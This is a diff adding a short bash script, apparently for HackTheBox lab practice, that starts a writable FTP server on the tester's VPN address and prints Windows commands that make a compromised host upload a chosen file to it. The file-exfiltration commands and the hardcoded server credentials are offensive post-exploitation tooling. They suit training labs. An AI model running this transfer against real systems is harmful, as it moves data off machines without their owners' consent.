@@ -1,0 +1,21 @@
+#!/bin/bash
+
+# HTB netowrk IP
+htbIP=$(ifconfig tun0 | grep -o "inet [^ ]*" | sed 's/inet //g')
+
+# file on windows machine wish to upload
+read -p 'Windows File To Upload?:' fileToUpload
+
+# Commands to be run on windows machine
+printf 'Commands to run on windows machine:\n'
+
+printf "echo 'open $htbIP' > ftp.txt\n"
+printf "echo 'USER htbuser' >> ftp.txt\n"
+printf "echo 'wannabeippsec' >> ftp.txt\n"
+printf "echo 'bin' >> ftp.txt\n"
+printf "echo 'put $fileToUpload' >> ftp.txt\n"
+printf "echo 'bye' >> ftp.txt\n"
+echo 'ftp -v -n -s:ftp.txt'
+
+# Start ftp server
+python3 -m pyftpdlib -p 21 -u htbuser -P wannabeippsec --write -d /home/rick/Documents/tools/ftpDrive
